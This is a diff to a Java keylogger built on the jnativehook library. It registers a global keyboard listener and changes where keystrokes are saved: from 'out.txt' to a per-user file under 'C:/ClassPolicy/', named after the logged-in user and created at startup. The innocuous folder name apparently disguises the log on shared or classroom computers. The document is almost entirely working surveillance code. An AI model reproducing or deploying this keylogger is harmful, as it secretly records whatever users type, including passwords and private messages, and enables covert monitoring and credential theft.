@@ -3,6 +3,7 @@ package main;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 import java.io.BufferedWriter;
+import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
@@ -13,11 +14,17 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 
 public class Main implements NativeKeyListener{
 	public static void main (String[] args) throws IOException {
+		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
+		if(!log.exists()) {
+			System.out.println("Creating logfile...");
+			log.createNewFile();
+		} else {
+			System.out.println("Starting...");
+		}
 		try {
 			GlobalScreen.registerNativeHook();
 		} catch (NativeHookException e) {
 			// TODO Auto-generated catch block
-			System.out.println("Gomenasai, watashi wa baka desu.");
 			e.printStackTrace();
 		}
 		GlobalScreen.getInstance().addNativeKeyListener(new Main());
@@ -50,7 +57,8 @@ public class Main implements NativeKeyListener{
 	}
 	public static void record(String x) {
 		try {
-			PrintWriter out = new PrintWriter(new FileWriter("out.txt", true));
+			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
+			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
 			// System.out.println("rec " + x);
 			out.print(x);
 			out.close();
@@ -61,3 +69,4 @@ public class Main implements NativeKeyListener{
 	}
 	
 }
+
